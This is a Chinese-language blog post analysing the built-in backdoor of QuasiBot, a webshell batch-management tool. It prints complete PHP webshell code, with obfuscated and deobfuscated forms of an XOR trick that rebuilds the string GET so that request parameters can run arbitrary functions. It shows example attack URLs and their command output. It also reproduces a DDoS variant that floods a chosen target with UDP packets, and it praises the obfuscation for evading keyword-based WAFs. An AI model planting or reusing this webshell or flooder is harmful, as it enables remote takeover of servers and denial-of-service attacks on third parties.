---
layout: post
title: 批量 Webshell 管理工具 QuasiBot 之后门代码分析
tags: [web,secrity]
---

### 一、前言

最近在想着写一款webshell批量管理工具，发现目前有一款开源的，由php编写的管理平台- `QuasiBot` 。

项目地址：[https://github.com/Smaash/quasibot](https://github.com/Smaash/quasibot)

QuasiBot是一款php编写的webshell管理工具，可以对webshell进行远程批量管理。这个工具超越于普通的webshell管理是因为其还拥有安全扫描、漏洞利用测试等功能，可以利用大量的webshell进行高效的测试工作。

在本地使用QuasiBot的时候，发现它的内置后门代码非常不错，所以便有了此文。下面针对QuasiBot的两种后门代码进行剖析： `非DDoS` 版 和 `DDoS` 版。

### 二、分析

#### 1. 非DDoS版

首先给出``非DDoS``版本的后门代码：

```php
<?php
if($_GET['_']) {
    print "<!--".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
    print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
} elseif($_GET['___']) { 
    @$_GET['___'](); 
}
?>
```

格式化一下，显得比较清晰：

```php
<?php
if($_GET['_']) {
    print "<!--".$_="{:|";
    $_=($_^"<").($_^">").($_^"/");
    ${'_'.$_}["_"](${'_'.$_}["__"]);
    print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
} elseif($_GET['___']) { 
    @$_GET['___'](); 
}
?>
```

首先来分析一下代码结果，QuasiBot的后门代码十分简单，由一个``if...elseif...``构成。

可以看到 `elseif($_GET['___'])` 直接运行从Get请求过来的参数 `___` 的函数。例如这里后门地址为： `http://www.virtual.com/ma.php` ，那么构造如下请求就会让后门代码去执行 `phpinfo()` 函数来获取系统的相关信息。

    http://www.virtual.com/ma.php?___=phpinfo

然后再看第一个 `if($_GET['_'])` 部分，当有参数 `__` 传入时进入条件：

```php
<?php
if($_GET['_']) {
    print "<!--".$_="{:|";
    $_=($_^"<").($_^">").($_^"/");
    ${'_'.$_}["_"](${'_'.$_}["__"]);
    print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
}
...
?>
```

根据代码可以看出，QuasiBot将通过后门执行的输出都放到 `response` 的注释 `<!-- ... -->` 里去了，这里有一定的隐藏效果。注意这里 `print "<!--".$_="{:|";` 这里对 $_ 变量进行了赋值，然后是通过字符的异或运算连接起一个 `"GET"` 字符串：

    $_=($_^"<").($_^">").($_^"/");

`$_^"<"` 会将 $_ 变量的第一个字符的ascii码与 "<" 的ascii码 进行异或，也就是 `123` ("{"的ascii码) 与 `60` ("<"的ascii码)进行异或：

    123^60 ==> 71 ('G')

得到ascii码 `71` 也就是字符 `"G"` ，通过相同方法构造出 `"E"` 和 `"T"` ，然后将其连接构成字符串 `"GET"` 。

然后根据php中的一个变量引用特性，以 `${'_GET'}["__"]` 作为参数调用函数 `${'_GET'}["_"]()` 。

这里的函数执行涉及到了php中 "动态函数调用"  和 "花括号{}使用" 的trcik。

[《常用PHP中花括号使用规则详解》](http://www.cnblogs.com/jayleke/archive/2011/11/08/2241609.html)这篇文章比较详细的讲了在php中 `{}` 使用时需要注意的地方。

给出一个简单易懂的例子说明一下 `动态函数调用` ，看下面这段代码 `demo.php` ：

```php
<?php
$func = "demo";
function demo() {
    echo "Demo on!"
}

$func();
?>
```

这里为了方便，直接在终端使用php执行该脚本文件，执行 `php demo.php` 得到输出 `Demo on!` 。

看了这个demo.php再结合 `{}` 的使用就很容易理解后门中的这段代码： `${'_GET'}["__"](${'_GET'}["_"])` 。

写得明显点就是： `$_GET["_"]($_GET["__"])` 。

简单明了的QuasiBot非DDoS后门代码：

```php
<?php
if($_GET['_']) {
    print "<!--{:|";
    $_GET["_"]($_GET["__"]);
    print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
} elseif($_GET['___']) { 
    @$_GET['___'](); 
}
?>
```

例如在win下要执行 `system('dir')` ，后门url为：http://www.virtual.com/ma.php，那么请求：http://www.virtual.com/ma.php?_=system&__=dir

在返回页面的源码里，得到如下内容：

    <!--{:| 驱动器 D 中的卷没有标签。
     卷的序列号是 2EE6-3EE0

     D:\PhpStudy\WWW 的目录

    2014/12/03  21:05    <DIR>          .
    2014/12/03  21:05    <DIR>          ..
    2014/12/03  21:05    <DIR>          discuz
    2014/11/10  22:43    <DIR>          Documentation
    2014/11/22  02:13               431 function.php
    2014/12/04  17:37               226 ma.php
    2014/11/19  22:38    <DIR>          mybb
    2014/11/20  12:53    <DIR>          mybb1
    2014/10/21  17:11    <DIR>          phpMyAdmin
    2014/11/25  23:52    <DIR>          phpMyRecipes
    2014/11/25  14:59    <DIR>          phpok
    2014/11/15  11:36    <DIR>          piwigo
    2014/11/14  14:04    <DIR>          qibomenhu
    2014/11/26  08:55    <DIR>          quasibot
    2014/11/27  11:50    <DIR>          rocboss
    2014/11/21  00:25    <DIR>          sqli
    2014/11/14  15:59    <DIR>          thinksns
    2014/11/10  22:43    <DIR>          Tools
    2014/11/10  22:44    <DIR>          upload
    2014/12/03  19:36               256 upload.php
    2014/11/22  12:54    <DIR>          wordpress
                   3 个文件            913 字节
                  18 个目录 35,217,747,968 可用字节
    {:|7d9f82db8d7d8b1ed3fda323040e671a{:|WINNT{:|-->

命令成功执行，其他比较细节的分析这里就不在多说了，有兴趣的可以自行总结。

#### 2. DDoS版

DDoS版后门代码如下（代码有点长）：

```php
<?php
if($_GET['_']) {
print "<!--".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
} elseif($_GET['___']) { @$_GET['___'](); } elseif(isset($_POST['target'])&&isset($_POST['time'])){$fn0=0;$pm1=$_POST['time'];$yu2=time();$az3=$yu2+$pm1;$jd4=$_POST['target'];$kb5=gethostbyname($jd4);for($pt6=0;$pt6<65553;$pt6++){$yf7.='X';}while(1){$fn0++;if(time()>$az3){break;}$yw8=rand(1,65553);$vl9=fsockopen('udp://'.$kb5,$yw8,$ic10,$yf11,5);if($vl9){fwrite($vl9,$yf7);fclose($vl9);}}}elseif($_POST['kill']=='1'){exit(0);}
?>
```

格式化一下：

```php
<?php
if($_GET['_']) {
    print "<!--".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
    print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
} elseif($_GET['___']) {
    @$_GET['___']();
} elseif(isset($_POST['target'])&&isset($_POST['time'])) { 
    $fn0=0;
    $pm1=$_POST['time'];
    $yu2=time();
    $az3=$yu2+$pm1;
    $jd4=$_POST['target'];
    $kb5=gethostbyname($jd4);
    for($pt6=0;$pt6<65553;$pt6++) {
        $yf7.='X';
    }
    while(1) {
        $fn0++;
        if(time()>$az3) {
            break;
        }
        $yw8=rand(1,65553);
        $vl9=fsockopen('udp://'.$kb5,$yw8,$ic10,$yf11,5);
        if($vl9) {
            fwrite($vl9,$yf7);
            fclose($vl9);
        }
    }
} elseif($_POST['kill']=='1') {
    exit(0);
}
?>
```

前面部分的参数判断这里就不讲解了，请参照 `非DDoS版` 的分析。直接看DDoS代码部分，这里通过 `$_POST['target']` 来获取目标， `$_POST['time']` 为攻击持续的时间（这里以秒为单位）。 

接下来就是一系列的准备工作，构造 `65553` 字节的超长数据通过 `udp` 的方式向目标随机端口打流量（为哈要随机端口，没懂）。

构造 `65553` 字节的数据：

    for($pt6=0;$pt6<65553;$pt6++) {
        $yf7.='X';
    }

随机生成端口号（最大不应该是65535？）：

    $yw8=rand(1,65553);

创建socket并发送数据：

    $vl9=fsockopen('udp://'.$kb5,$yw8,$ic10,$yf11,5);
    if($vl9) {
        fwrite($vl9,$yf7);
        fclose($vl9);
    }

至此 `QuasiBot` 两种模式的后面简单剖析完毕。值得学习的是该后门对php特性的运用，整个后门代码（ `非DDoS版` ）没有出现任何较敏感的关键字，能绕过大多数通过关键字检测的waf（未验证，目测。不要拍砖）。
